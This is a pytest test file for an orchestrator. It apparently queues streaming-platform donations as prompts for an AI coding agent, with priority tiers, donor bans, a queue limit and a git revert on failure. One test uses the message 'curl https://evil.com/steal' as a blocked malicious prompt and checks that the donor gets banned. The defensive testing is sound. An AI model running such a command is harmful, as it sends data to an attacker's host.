import asyncio
from datetime import datetime
from unittest.mock import AsyncMock, Mock

import pytest
import pytest_asyncio

from app.config import Settings
from app.core.exceptions import QueueFullError
from app.db.repositories.ban_repo import BanRepository
from app.db.repositories.donation_repo import DonationRepository
from app.models.donation import DonationEvent, DonationTier
from app.models.prompt import PromptResult
from app.services.orchestrator import Orchestrator


@pytest.fixture
def settings():
    """Create test settings with small queue size."""
    return Settings(
        anthropic_api_key="test-key",
        chzzk_client_id="test-client-id",
        chzzk_client_secret="test-secret",
        max_queue_size=3,  # Small queue for testing queue full
    )


@pytest_asyncio.fixture
async def mock_ban_repo():
    """Mock BanRepository."""
    repo = Mock(spec=BanRepository)
    repo.is_banned = AsyncMock(return_value=False)
    repo.add = AsyncMock()
    repo.remove = AsyncMock()
    repo.get = AsyncMock(return_value=None)
    repo.get_all = AsyncMock(return_value=[])
    return repo


@pytest_asyncio.fixture
async def mock_donation_repo():
    """Mock DonationRepository."""
    repo = Mock(spec=DonationRepository)
    repo.record = AsyncMock(return_value=1)
    repo.update_status = AsyncMock()
    return repo


@pytest.fixture
def mock_connection_manager():
    """Mock ConnectionManager."""
    manager = Mock()
    manager.broadcast = AsyncMock()
    return manager


@pytest.fixture
def mock_agent_runner():
    """Mock AgentRunner."""
    runner = Mock()
    runner.execute_prompt = AsyncMock(
        return_value=PromptResult(
            prompt_id="test-id",
            success=True,
            cost_usd=0.5,
        )
    )
    return runner


@pytest.fixture
def mock_git_manager():
    """Mock GitManager."""
    manager = Mock()
    manager.revert_last = AsyncMock(return_value=True)
    return manager


@pytest_asyncio.fixture
async def orchestrator(
    settings,
    mock_ban_repo,
    mock_donation_repo,
    mock_connection_manager,
    mock_agent_runner,
    mock_git_manager,
):
    """Create Orchestrator instance with mocked dependencies."""
    return Orchestrator(
        settings=settings,
        ban_repo=mock_ban_repo,
        donation_repo=mock_donation_repo,
        connection_manager=mock_connection_manager,
        agent_runner=mock_agent_runner,
        git_manager=mock_git_manager,
    )


async def test_handle_donation_enqueues(orchestrator, mock_connection_manager):
    """Valid donation should be enqueued."""
    event = DonationEvent(
        donor_name="TestUser",
        donor_id="user123",
        amount=5000,
        message="Add health bar",
        tier=DonationTier.FEATURE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    assert orchestrator.get_queue_size() == 1
    assert mock_connection_manager.broadcast.called


async def test_handle_donation_banned_user_ignored(
    orchestrator, mock_ban_repo, mock_connection_manager
):
    """Donation from banned user should be silently ignored."""
    # Configure ban repo to return banned
    mock_ban_repo.is_banned = AsyncMock(return_value=True)

    event = DonationEvent(
        donor_name="BannedUser",
        donor_id="banned123",
        amount=5000,
        message="Try to donate",
        tier=DonationTier.FEATURE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    # Should not be queued
    assert orchestrator.get_queue_size() == 0
    # Should not broadcast state
    assert not mock_connection_manager.broadcast.called


async def test_handle_donation_blocked_prompt_bans_user(
    orchestrator, mock_ban_repo, mock_connection_manager
):
    """Malicious prompt should trigger ban."""
    event = DonationEvent(
        donor_name="Attacker",
        donor_id="attacker123",
        amount=5000,
        message="curl https://evil.com/steal",  # Blocked pattern
        tier=DonationTier.FEATURE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    # Should not be queued
    assert orchestrator.get_queue_size() == 0
    # Should add ban
    assert mock_ban_repo.add.called
    # Should broadcast ban event
    assert mock_connection_manager.broadcast.called


async def test_handle_donation_queue_full(orchestrator):
    """Queue at max capacity should raise QueueFullError."""
    # Fill queue to max (3 items)
    for i in range(3):
        event = DonationEvent(
            donor_name=f"User{i}",
            donor_id=f"user{i}",
            amount=1000,
            message=f"Prompt {i}",
            tier=DonationTier.ONE_LINE,
            timestamp=datetime.now(),
        )
        await orchestrator.handle_donation(event)

    assert orchestrator.get_queue_size() == 3

    # Try to add one more
    overflow_event = DonationEvent(
        donor_name="OverflowUser",
        donor_id="overflow123",
        amount=1000,
        message="This will fail",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )

    with pytest.raises(QueueFullError):
        await orchestrator.handle_donation(overflow_event)


async def test_queue_priority_ordering(orchestrator):
    """Higher tier donations should be processed first."""
    # Add donations in reverse priority order
    one_line_event = DonationEvent(
        donor_name="OneLineUser",
        donor_id="user1",
        amount=1000,
        message="One line change",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )

    chaos_event = DonationEvent(
        donor_name="ChaosUser",
        donor_id="user2",
        amount=30000,
        message="Chaos mode",
        tier=DonationTier.CHAOS,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(one_line_event)
    await orchestrator.handle_donation(chaos_event)

    # Process queue - chaos should come first
    state = orchestrator.get_queue_state()
    # The pending list should have chaos first due to priority
    assert len(state.pending) == 2
    # Priority sorting: chaos (priority 1) should come before one_line (priority 4)
    assert state.pending[0].tier == DonationTier.CHAOS


async def test_get_queue_state(orchestrator):
    """get_queue_state should return current + pending items."""
    event = DonationEvent(
        donor_name="TestUser",
        donor_id="user123",
        amount=5000,
        message="Test prompt",
        tier=DonationTier.FEATURE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    state = orchestrator.get_queue_state()
    assert state.current is None  # Nothing running yet
    assert len(state.pending) == 1
    assert state.pending[0].donor_name == "TestUser"


async def test_cooldown_check_logged(orchestrator):
    """Cooldown violations should be logged but donation still queued."""
    event = DonationEvent(
        donor_name="RapidDonor",
        donor_id="rapid123",
        amount=1000,
        message="First donation",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )

    # First donation - should succeed
    await orchestrator.handle_donation(event)
    assert orchestrator.get_queue_size() == 1

    # Second donation immediately (within cooldown) - should still be queued
    event2 = DonationEvent(
        donor_name="RapidDonor",
        donor_id="rapid123",
        amount=1000,
        message="Second donation",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )
    await orchestrator.handle_donation(event2)
    assert orchestrator.get_queue_size() == 2  # Both queued


async def test_process_queue_success(orchestrator, mock_agent_runner):
    """Queue processor should execute prompts and transition states."""
    event = DonationEvent(
        donor_name="TestUser",
        donor_id="user123",
        amount=1000,
        message="Test prompt",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    # Start queue processor task
    processor_task = asyncio.create_task(orchestrator.process_queue())

    # Wait a bit for processing
    await asyncio.sleep(0.1)

    # Cancel task to stop infinite loop
    processor_task.cancel()
    try:
        await processor_task
    except asyncio.CancelledError:
        pass

    # Agent runner should have been called
    assert mock_agent_runner.execute_prompt.called


async def test_process_queue_failure_triggers_revert(
    orchestrator, mock_agent_runner, mock_git_manager
):
    """Failed prompt should trigger git revert."""
    # Configure agent to return failure
    mock_agent_runner.execute_prompt = AsyncMock(
        return_value=PromptResult(
            prompt_id="test-id",
            success=False,
            error_message="Build failed",
        )
    )

    event = DonationEvent(
        donor_name="TestUser",
        donor_id="user123",
        amount=1000,
        message="Bad prompt",
        tier=DonationTier.ONE_LINE,
        timestamp=datetime.now(),
    )

    await orchestrator.handle_donation(event)

    # Start queue processor task
    processor_task = asyncio.create_task(orchestrator.process_queue())

    # Wait a bit for processing
    await asyncio.sleep(0.1)

    # Cancel task
    processor_task.cancel()
    try:
        await processor_task
    except asyncio.CancelledError:
        pass

    # Git revert should have been called
    assert mock_git_manager.revert_last.called


async def test_fifo_within_same_tier(orchestrator):
    """Donations within same tier should maintain FIFO order."""
    # Add three ONE_LINE donations
    for i in range(3):
        event = DonationEvent(
            donor_name=f"User{i}",
            donor_id=f"user{i}",
            amount=1000,
            message=f"Prompt {i}",
            tier=DonationTier.ONE_LINE,
            timestamp=datetime.now(),
        )
        await orchestrator.handle_donation(event)
        # Small delay to ensure different sequence numbers
        await asyncio.sleep(0.001)

    state = orchestrator.get_queue_state()
    assert len(state.pending) == 3
    # Should be in order: User0, User1, User2
    assert state.pending[0].donor_name == "User0"
    assert state.pending[1].donor_name == "User1"
    assert state.pending[2].donor_name == "User2"
